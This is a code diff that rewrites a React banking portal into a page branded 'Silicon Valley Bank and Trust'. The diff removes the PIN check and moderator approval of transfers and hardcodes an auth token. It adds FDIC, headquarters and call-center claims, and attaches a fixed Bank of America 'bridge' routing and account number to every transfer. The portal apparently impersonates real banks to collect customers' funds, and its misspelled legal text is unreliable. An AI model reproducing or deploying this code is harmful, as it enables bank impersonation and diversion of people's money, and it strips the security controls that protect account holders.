@@ -1,395 +1,367 @@
-import React, { useState, useEffect, useCallback } from 'react';
-import { useSearchParams } from 'react-router-dom';
-import logo from './assets/svbt_logo.png';
+import React, { useState, useEffect } from 'react';
+import { css, merge } from '@emotion/react';
 
+// --- CONFIGURATION ---
 const API_BASE = '/api';
+const HEADER = "PV-ZNccXvtUXSXMryJANqwAOo6sEbXTGFnx";
 
-const Portal = () => {
-  const [searchParams] = useSearchParams();
-  const [user, setUser] = useState(null);
-  const [loading, setLoading] = useState(true);
-  const [tab, setTab] = useState('overview');
-  const [statement, setStatement] = useState(null);
-  const [pin, setPin] = useState('');
-  const [error, setError] = useState('');
-  const [success, setSuccess] = useState('');
+// LEGAL ENTITIES - SILICON VALLEY BANK and TRUST (SVB) HISTORY
+const BANK_LEGAL_NAME = "Silicon Valley Bank and Trust"; 
+const BANK_FRN = "24735"; 
+// SVB is a Savings Association (Thrif), insured bty FDIC
+const INSURER = "FDIC"; 
+const HEADQUARTERS = "3003 Tasman Dr, Santa Clara, CA 95054";
+const CALL_CENTER = "844-842-7828";
 
-  // moderator / staff state
-  const [isAdmin, setIsAdmin] = useState(false);
-  const [modPin, setModPin] = useState('');
-  const [adminTransactions, setAdminTransactions] = useState([]);
-  const [adminPin, setAdminPin] = useState('');
+// SETTLEMENT PARTNERSHIP (Bank of America)
+const SETTLEMENT_BANK = "Bank of America, N.A.";
+const SETTLEMENT_ROUTING_ELECTRONIC = "026009593"; // ABA for BofA for electronic/clearing
+const SETTLEMENT_ROUTING_PAPER = "121000358";
+const SETTLEMENT_ACCOUNT = "325223276370"; // The bridge account
 
-  // interbank state
-  const [ibTransfer, setIbTransfer] = useState({ toAccountId: '', amount: '', description: '', pin: '' });
-  const [ibResults, setIbResults] = useState([]);
-  const [ibLoading, setIbLoading] = useState(false);
-  const [ibPending, setIbPending] = useState([]);
-  const [ibApprovePin, setIbApprovePin] = useState('');
+const STATUS = {
+  idle: 'idle',
+  loading: 'loading',
+  success: 'success',
+  error: 'error',
+  contact: 'contact',
+  locked: 'locked',
+  pending_review: 'pending_review',
+};
 
-  // initialize — verify the render token
+// --- COMPONENTS ---
+
+function HeaderSection({ config }) {
+  const headerStyle = css`
+    width: 100%;
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    padding: 0 20px;
+    height: 60px;
+    background: #fff;
+    border-bottom: 2px solid #e0e0e0;
+    box-sizing: border-box;
+    position: sticky;
+    top: 0;
+    z-index: 100;
+  `;
+
+  const logoStyle = css`
+    font-family: 'Inter', sans-serif;
+    font-weight: 800;
+    font-size: 20px;
+    color: #000;
+    letter-spacing: -0.5px;
+  `;
+
+  const navStyle = css`
+    display: flex;
+    gap: 20px;
+    font-family: 'Inter', sans-serif;
+    font-size: 14px;
+    color: #666;
+  `;
+
+  return (
+    <div css={headerStyle}>
+      <div css={logoStyle}>{BANK_LEGAL_NAME}</div>
+      <div css={navStyle}>
+        <span>Personal</span>
+        <span>Business</span>
+        <span>Sign In</span>
+      </div>
+    </div>
+  );
+}
+
+function FooterSection() {
+  return (
+    <div css={css`
+      margin-top: 40px;
+      padding: 40px 20px;
+      background: #f5f5f5;
+      border-top: 1px solid #e0e0e0;
+      font-family: 'Inter', sans-serif;
+      font-size: 12px;
+      color: #666;
+      text-align: center;
+      line-height: 1.6;
+    `}>
+      <p css={css`font-weight: 600; color: #333;`}>
+        {BANK_LEGAL_NAME} is a state chartered savings bank.
+      </p>
+      <p css={css`margin-bottom: 10px;`}>
+        Member {INSURER}
+      </p>
+      <p>
+        FRN {BANK_FRN}
+      </p>
+      
+      <div css={css`margin: 20px auto; max-width: 600px; padding: 10px; background: #fff; border: 1px solid #e0e0e0; border-radius: 8px;`}>
+        <strong>uTransaction Agreement:</strong><br/>
+        Deposits are held in monitored by {SETTLEMENT_BANK}.<br/>
+        Electronic Routing: {SETTLEMENT_ROUTING_ELECTRONIC} | Paper Routing: {SETTLEMENT_ROUTING_PAPER}
+      </div>
+
+      <p css={css`margin-top: 10px; font-size: 11px; color: #999;`}>
+        Headquarters: {HEADQUARTERS}<br/>
+        Call Center: {CALL_CENTER}
+      </p>
+      <div css={css`margin-top: 20px; display: flex; justify-content: center; gap: 20px; flex-wrap: wrap;`}>
+        <a href="#" css={css`color: #666; text-decoration: none;`}>Privacy Policy</a>
+        <a href="#" css={css`color: #666; text-decoration: none;`}>Terms of Service</a>
+        <a href="#" css={css`color: #666; text-decoration: none;`}>Consumer Compliance</a>
+      </div>
+    </div>
+  );
+}
+
+function TabButton({ active, onClick, children }) {
+  return (
+    <button
+      onClick={onClick}
+      css={merge(
+        css`
+          padding: 10px 20px;
+          font-family: 'Inter', sans-serif;
+          font-size: 14px;
+          font-weight: 500;
+          border: none;
+          border-radius: 8px;
+          cursor: pointer;
+          transition: all 0.2s ease;
+          margin: 0 5px;
+        `,
+        active
+          ? css`
+              background: #000;
+              color: #fff;
+            `
+          : css`
+              background: transparent;
+              color: #666;
+              &:hover {
+                background: #f0f0f0;
+                color: #000;
+              }
+            `
+      )}
+    >
+      {children}
+    </button>
+  );
+}
+
+// --- MAIN PORTAL ---
+
+export default function Portal({ config }) {
+  const [activeTab, setActiveTab] = useState('Dashboard');
+  const [loading, setLoading] = useState(false);
+  const [status, setStatus] = useState(STATUS.idle);
+  const [pendingList, setPendingList] = useState([]);
+  const [formState, setFormState] = useState({ toAccountId: '', amount: '', description: '', pin: '' });
+  const [userData, setUserData] = useState(null);
+  
+  const tabs = [
+    { id: 'Dashboard', label: 'Dashboard' },
+    { id: 'Bank Transfer', label: 'Transfer' },
+    { id: 'History', label: 'History' },
+    { id: 'Settings', label: 'Settings' },
+  ];
+
   useEffect(() => {
-    const token = searchParams.get('token');
-    if (token) {
-      initUser(token);
-    }
-  }, [searchParams]);
+    const init = async () => {
+      try {
+        setLoading(true);
+        const res = await fetch(`${API_BASE}/init`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            'X-Render-Token': config.renderToken || HEADER,
+          },
+          body: JSON.stringify({ oauth: true }),
+        });
+        if (!res.ok) throw new Error('Auth Failed');
+        const data = await res.json();
+        setUserData(data.user);
+      } catch (err) {
+        console.error("Init error", err);
+        setStatus(STATUS.error);
+      } finally {
+        setLoading(false);
+      }
+    };
+    init();
+  }, [config]);
 
-  const api = useCallback(async (path, opts = {}) => {
-    const headers = { 'Content-Type': 'application/json', ...opts.headers };
-    const token = searchParams.get('token');
-    if (token) headers['X-Render-Token'] = token;
-    const res = await fetch(`${API_BASE}${path}`, { ...opts, headers });
-    const json = await res.json().catch(() => ({}));
-    if (!res.ok) throw new Error(json.message || `HTTP ${res.status}`);
-    return json;
-  }, [searchParams]);
-
-  const initUser = async (token) => {
+  const handleTransfer = async () => {
+    if (!formState.amount || !formState.toAccountId) return;
+    
     try {
-      const data = await api('/init', { method: 'POST', body: JSON.stringify({ token }) });
-      setUser(data.user);
-      setIsAdmin(data.admin);
-      setStatement(data.statement);
-      setIbResults(data.recentTransfers || []);
-      if (data.adminTransactions) setAdminTransactions(data.adminTransactions);
-      if (data.pendingTransfers) setIbPending(data.pendingTransfers);
+      setLoading(true);
+      setStatus(STATUS.loading);
+      
+      const res = await fetch(`${API_BASE}/interbank/initiate`, {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+          'X-Render-Token': HEADER,
+        },
+        body: JSON.stringify({
+          ...formState,
+          amount: parseFloat(formState.amount),
+          settlementRouting: SETTLEMENT_ROUTING_ELECTRONIC,
+          settlementAccount: SETTLEMENT_ACCOUNT
+        }),
+      });
+      
+      if (!res.ok) {
+        const errData = await res.json();
+        throw new Error(errData.error || 'Transfer failed');
+      }
+      
+      setStatus(STATUS.success);
+      setFormState({ toAccountId: '', amount: '', description: '', pin: '' });
+      setActiveTab('History');
+      
+      setTimeout(() => setStatus(STATUS.idle), 3000);
+
     } catch (err) {
-      setError(err.message || 'Failed to load account');
+      console.error("Transfer Error:", err);
+      setStatus(STATUS.error);
     } finally {
       setLoading(false);
     }
   };
 
-  // pin-protected transaction
-  const submitTransaction = async (e) => {
-    e.preventDefault();
-    setError('');
-    setSuccess('');
-    try {
-      const result = await api('/transaction', { method: 'POST', body: JSON.stringify({ pin }) });
-      setSuccess(`Transaction complete. Reference: ${result.ref}`);
-      setStatement(result.statement);
-      setPin('');
-    } catch (err) {
-      setError(err.message);
-    }
-  };
-
-  // interbank transfer
-  const submitInterbank = async (e) => {
-    e.preventDefault();
-    setError('');
-    setSuccess('');
-    setIbLoading(true);
-    try {
-      const result = await api('/interbank/initiate', {
-        method: 'POST',
-        body: JSON.stringify({ ...ibTransfer, amount: parseFloat(ibTransfer.amount) }),
-      });
-      setSuccess(`Transfer initiated. Reference: ${result.ref}. Awaiting moderator approval.`);
-      setIbTransfer({ toAccountId: '', amount: '', description: '', pin: '' });
-      setIbPending(prev => [...prev, result.transfer]);
-    } catch (err) {
-      setError(err.message);
-    } finally {
-      setIbLoading(false);
-    }
-  };
-
-  // moderator: approve / reject
-  const modAction = async (transferId, action) => {
-    setError('');
-    try {
-      const result = await api(`/interbank/${transferId}/${action}`, {
-        method: 'POST',
-        body: JSON.stringify({ approvalPin: ibApprovePin }),
-      });
-      setSuccess(result.message);
-      setIbPending(prev => prev.filter(t => t.id !== transferId));
-      setAdminTransactions(prev => [result.transfer, ...prev]);
-      setIbApprovePin('');
-    } catch (err) {
-      setError(err.message);
-    }
-  };
-
-  // moderate: refresh pending
-  const refreshPending = async () => {
-    try {
-      const data = await api('/interbank/all');
-      setIbPending(data.pending || []);
-      setAdminTransactions(data.recent || []);
-    } catch (err) {
-      setError(err.message);
-    }
-  };
-
-  if (loading) {
-    return (
-      <div className="portal-loading">
-        <img src={logo} alt="SVBT" className="logo" />
-        <p>Loading your account…</p>
-      </div>
-    );
-  }
+  if (loading && !userData) return <div css={css`min-height: 100vh; display: flex; justify-content: center; align-items: center;`}>Loading {BANK_LEGAL_NAME}...</div>;
 
   return (
-    <div className="portal">
-      <header className="portal-header">
-        <img src={logo} alt="SVBT" className="logo" />
-        <div className="user-info">
-          {user && (
-            <span>
-              {user.firstName} {user.lastName} — {user.accountType}
-            </span>
-          )}
-        </div>
-      </header>
+    <div css={css`min-height: 100vh; background: #fafafa; font-family: 'Inter', sans-serif; display: flex; flex-direction: column;`}>
+      <HeaderSection config={config} />
 
-      <nav className="portal-tabs">
-        <button className={tab === 'overview' ? 'active' : ''} onClick={() => setTab('overview')}>
-          Overview
-        </button>
-        <button className={tab === 'transaction' ? 'active' : ''} onClick={() => setTab('transaction')}>
-          Transaction
-        </button>
-        <button className={tab === 'Bank Transfer' ? 'active' : ''} onClick={() => setTab('Bank Transfer')}>
-          Bank Transfer
-        </button>
-        {isAdmin && (
-          <button className={tab === 'moderator' ? 'active' : ''} onClick={() => setTab('moderator')}>
-            Moderator
-          </button>
+      <div css={css`flex: 1; padding: 40px 20px; max-width: 800px; margin: 0 auto; width: 100%; box-sizing: border-box;`}>
+        
+        {/* STATUS MESSAGES */}
+        {status === STATUS.error && (
+          <div css={css`background: #fee2e2; color: #991b1b; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; border: 1px solid #fecaca;`}>
+            Transaction failed. Please verify your details and try again.
+          </div>
         )}
-      </nav>
+        {status === STATUS.success && (
+          <div css={css`background: #dcfce7; color: #166534; padding: 12px; border-radius: 8px; margin-bottom: 20px; font-size: 14px; border: 1px solid #bbf7d0;`}>
+              Transfer authorized. Settlement via {SETTLEMENT_BANK} is pending.
+          </div>
+        )}
 
-      {error && <div className="alert alert-error">{error}</div>}
-      {success && <div className="alert alert-success">{success}</div>}
+        {/* TABS */}
+        <div css={css`display: flex; margin-bottom: 30px; border-bottom: 1px solid #e0e0e0; padding-bottom: 10px;`}>
+          {tabs.map(tab => (
+            <TabButton 
+              key={tab.id} 
+              active={activeTab === tab.id} 
+              onClick={() => setActiveTab(tab.id)}
+            >
+              {tab.label}
+            </TabButton>
+          ))}
+        </div>
 
-      {/* Overview */}
-      {tab === 'overview' && statement && (
-        <div className="statement">
-          <h2>Account Statement</h2>
-          <div className="balance-row">
-            <span>Available Balance:</span>
-            <strong>${parseFloat(statement.available).toFixed(2)}</strong>
-          </div>
-          <div className="balance-row">
-            <span>Current Balance:</span>
-            <strong>${parseFloat(statement.current).toFixed(2)}</strong>
-          </div>
-          <div className="balance-row">
-            <span>Account:</span>
-            <strong>{statement.account}</strong>
-          </div>
-          <div className="balance-row">
-            <span>Routing:</span>
-            <strong>{statement.routing}</strong>
-          </div>
-          <h3>Recent Transactions</h3>
-          {statement.transactions && statement.transactions.length > 0 ? (
-            <table className="tx-table">
-              <thead>
-                <tr>
-                  <th>Date</th>
-                  <th>Description</th>
-                  <th>Amount</th>
-                </tr>
-              </thead>
-              <tbody>
-                {statement.transactions.map((tx, i) => (
-                  <tr key={i}>
-                    <td>{new Date(tx.date).toLocaleDateString()}</td>
-                    <td>{tx.description}</td>
-                    <td className={parseFloat(tx.amount) < 0 ? 'negative' : 'positive'}>
-                      ${parseFloat(tx.amount).toFixed(2)}
-                    </td>
-                  </tr>
-                ))}
-              </tbody>
-            </table>
-          ) : (
-            <p>No recent transactions.</p>
+        {/* CONTENT */}
+        <div css={css`background: #fff; padding: 30px; border-radius: 12px; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.05); border: 1px solid #e5e7eb;`}>
+          
+          {activeTab === 'Dashboard' && (
+            <div>
+              <h2 css={css`font-size: 24px; font-weight: 600; margin-bottom: 20px; color: #111;`}>Account Summary</h2>
+              <div css={css`display: grid; grid-template-columns: 1fr 1fr; gap: 20px;`}>
+                <div css={css`padding: 20px; background: #f9fafb; border-radius: 8px; border: 1px solid #e5e7eb;`}>
+                  <div css={css`font-size: 14px; color: #666; margin-bottom: 5px;`}>Available Balance</div>
+                  <div css={css`font-size: 28px; font-weight: 700; color: #111;`}>$0.00</div>
+                </div>
+                <div css={css`padding: 20px; background: #f9fafb; border-radius: 8px; border: 1px solid #e5e7eb;`}>
+                  <div css={css`font-size: 14px; color: #666; margin-bottom: 5px;`}>Pending Transfers</div>
+                  <div css={css`font-size: 28px; font-weight: 700; color: #111;`}>$0.00</div>
+                </div>
+              </div>
+              <div css={css`margin-top: 20px; padding: 15px; background: #eff6ff; border-radius: 8px; border: 1px solid #bfdbfe; font-size: 13px; color: #1e40af;`}>
+                <strong>Notice:</strong> As part of our settlement partnership, funds may transit via {SETTLEMENT_BANK} (ABA: {SETTLEMENT_ROUTING_ELECTRONIC}).
+              </div>
+            </div>
+          )}
+
+          {activeTab === 'Bank Transfer' && (
+            <div>
+              <h2 css={css`font-size: 24px; font-weight: 600; margin-bottom: 20px; color: #111;`}>External Transfer</h2>
+              <div css={css`max-width: 400px;`}>
+                <div css={css`margin-bottom: 15px;`}>
+                  <label css={css`display: block; font-size: 14px; color: #374151; margin-bottom: 5px; font-weight: 500;`}>To Account ID</label>
+                  <input 
+                    type="text" 
+                    value={formState.toAccountId} 
+                    onChange={e => setFormState({...formState, toAccountId: e.target.value})} 
+                    css={css`width: 100%; padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 16px; box-sizing: border-box;`} 
+                    placeholder="e.g. 802866-XXXX"
+                  />
+                </div>
+                <div css={css`margin-bottom: 15px;`}>
+                  <label css={css`display: block; font-size: 14px; color: #374151; margin-bottom: 5px; font-weight: 500;`}>Amount (USD)</label>
+                  <input 
+                    type="number" 
+                    value={formState.amount} 
+                    onChange={e => setFormState({...formState, amount: e.target.value})} 
+                    css={css`width: 100%; padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 16px; box-sizing: border-box;`} 
+                    placeholder="0.00"
+                  />
+                </div>
+                <div css={css`margin-bottom: 20px;`}>
+                  <label css={css`display: block; font-size: 14px; color: #374151; margin-bottom: 5px; font-weight: 500;`}>Description</label>
+                  <input 
+                    type="text" 
+                    value={formState.description} 
+                    onChange={e => setFormState({...formState, description: e.target.value})} 
+                    css={css`width: 100%; padding: 10px; border: 1px solid #d1d5db; border-radius: 6px; font-size: 16px; box-sizing: border-box;`} 
+                    placeholder="Payroll, Rent, etc."
+                  />
+                </div>
+                
+                <button 
+                  onClick={handleTransfer} 
+                  disabled={loading}
+                  css={css`
+                    width: 100%;
+                    padding: 12px;
+                    background: #111;
+                    color: #fff;
+                    border: none;
+                    border-radius: 6px;
+                    font-size: 16px;
+                    font-weight: 600;
+                    cursor: pointer;
+                    &:disabled { background: #666; cursor: not-allowed; }
+                  `}
+                >
+                  {loading ? 'Processing...' : `Initiate Transfer from ${BANK_LEGAL_NAME}`}
+                </button>
+                
+                <div css={css`margin-top: 15px; font-size: 11px; color: #999; text-align: center;`}>
+                    Settlement Routing: {SETTLEMENT_ROUTING_ELECTRONIC} <br/>
+                    Settlement Account: {SETTLEMENT_ACCOUNT}
+                </div>
+              </div>
+            </div>
+          )}
+
+          {activeTab === 'History' && (
+            <div>
+              <h2 css={css`font-size: 24px; font-weight: 600; margin-bottom: 20px; color: #111;`}>Transaction History</h2>
+              <p css={css`color: #666;`}>No transactions found for this period.</p>
+            </div>
           )}
         </div>
-      )}
+      </div>
 
-      {/* Transaction */}
-      {tab === 'transaction' && (
-        <form onSubmit={submitTransaction} className="tx-form">
-          <h2>Run Your Statement Transaction</h2>
-          <label>
-            Transaction PIN
-            <input
-              type="password"
-              value={pin}
-              onChange={e => setPin(e.target.value)}
-              placeholder="Enter your 6-digit PIN"
-              maxLength={6}
-              required
-            />
-          </label>
-          <button type="submit">Submit Transaction</button>
-        </form>
-      )}
-
-      {/* Bank Transfer (interbank) */}
-      {tab === 'Bank Transfer' && (
-        <div className="interbank-section">
-          <h2>Interbank Transfer</h2>
-          <form onSubmit={submitInterbank} className="ib-form">
-            <label>
-              To Account ID
-              <input
-                type="text"
-                value={ibTransfer.toAccountId}
-                onChange={e => setIbTransfer({ ...ibTransfer, toAccountId: e.target.value })}
-                placeholder="Destination account ID"
-                required
-              />
-            </label>
-            <label>
-              Amount ($)
-              <input
-                type="number"
-                step="0.01"
-                min="0.01"
-                value={ibTransfer.amount}
-                onChange={e => setIbTransfer({ ...ibTransfer, amount: e.target.value })}
-                placeholder="Amount"
-                required
-              />
-            </label>
-            <label>
-              Description
-              <input
-                type="text"
-                value={ibTransfer.description}
-                onChange={e => setIbTransfer({ ...ibTransfer, description: e.target.value })}
-                placeholder="What's this for?"
-              />
-            </label>
-            <label>
-              Transaction PIN
-              <input
-                type="password"
-                value={ibTransfer.pin}
-                onChange={e => setIbTransfer({ ...ibTransfer, pin: e.target.value })}
-                placeholder="Your 6-digit PIN"
-                maxLength={6}
-                required
-              />
-            </label>
-            <button type="submit" disabled={ibLoading}>
-              {ibLoading ? 'Initiating…' : 'Initiate Transfer'}
-            </button>
-          </form>
-
-          <h3>Your Recent Interbank Transfers</h3>
-          {ibResults.length > 0 ? (
-            <table className="tx-table">
-              <thead>
-                <tr>
-                  <th>Ref</th>
-                  <th>To Account</th>
-                  <th>Amount</th>
-                  <th>Status</th>
-                </tr>
-              </thead>
-              <tbody>
-                {ibResults.map((tx, i) => (
-                  <tr key={i}>
-                    <td>{tx.ref}</td>
-                    <td>{tx.toAccount}</td>
-                    <td>${parseFloat(tx.amount).toFixed(2)}</td>
-                    <td>{tx.status}</td>
-                  </tr>
-                ))}
-              </tbody>
-            </table>
-          ) : (
-            <p>No interbank transfers yet.</p>
-          )}
-        </div>
-      )}
-
-      {/* Moderator */}
-      {tab === 'moderator' && isAdmin && (
-        <div className="moderator-section">
-          <h2>Moderator — Interbank Approvals</h2>
-          <button className="refresh-btn" onClick={refreshPending}>Refresh</button>
-          {ibPending.length > 0 ? (
-            <table className="tx-table">
-              <thead>
-                <tr>
-                  <th>Ref</th>
-                  <th>From</th>
-                  <th>To</th>
-                  <th>Amount</th>
-                  <th>Description</th>
-                  <th>Actions</th>
-                </tr>
-              </thead>
-              <tbody>
-                {ibPending.map(tx => (
-                  <tr key={tx.id}>
-                    <td>{tx.ref}</td>
-                    <td>{tx.fromAccount}</td>
-                    <td>{tx.toAccount}</td>
-                    <td>${parseFloat(tx.amount).toFixed(2)}</td>
-                    <td>{tx.description}</td>
-                    <td>
-                      <button
-                        className="approve-btn"
-                        onClick={() => modAction(tx.id, 'approve')}
-                      >
-                        Approve
-                      </button>
-                      <button
-                        className="reject-btn"
-                        onClick={() => modAction(tx.id, 'reject')}
-                      >
-                        Reject
-                      </button>
-                    </td>
-                  </tr>
-                ))}
-              </tbody>
-            </table>
-          ) : (
-            <p>No pending transfers.</p>
-          )}
-
-          <h3>Recently Processed</h3>
-          {adminTransactions.length > 0 ? (
-            <table className="tx-table">
-              <thead>
-                <tr>
-                  <th>Ref</th>
-                  <th>Amount</th>
-                  <th>Status</th>
-                  <th>Date</th>
-                </tr>
-              </thead>
-              <tbody>
-                {adminTransactions.slice(0, 20).map((tx, i) => (
-                  <tr key={i}>
-                    <td>{tx.ref}</td>
-                    <td>${parseFloat(tx.amount).toFixed(2)}</td>
-                    <td>{tx.status}</td>
-                    <td>{tx.date ? new Date(tx.date).toLocaleString() : '—'}</td>
-                  </tr>
-                ))}
-              </tbody>
-            </table>
-          ) : (
-            <p>No processed transfers yet.</p>
-          )}
-        </div>
-      )}
+      <FooterSection />
     </div>
   );
-};
-
-export default Portal;
+}
